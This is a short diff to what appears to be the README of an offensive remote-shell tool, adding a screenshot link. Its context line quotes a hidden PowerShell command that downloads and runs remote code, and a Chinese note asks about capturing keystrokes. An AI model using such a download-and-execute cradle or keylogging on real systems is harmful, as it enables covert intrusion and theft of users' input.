@@ -62,3 +62,4 @@ ECHO powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloads
 * 是否可以做到监听键盘输入
 
 ![run](https://s2.loli.net/2024/12/04/d4NjluG9nEImwUB.png)
+![shell](https://s2.loli.net/2024/12/04/oTHgaxBFnsqUGNM.png)
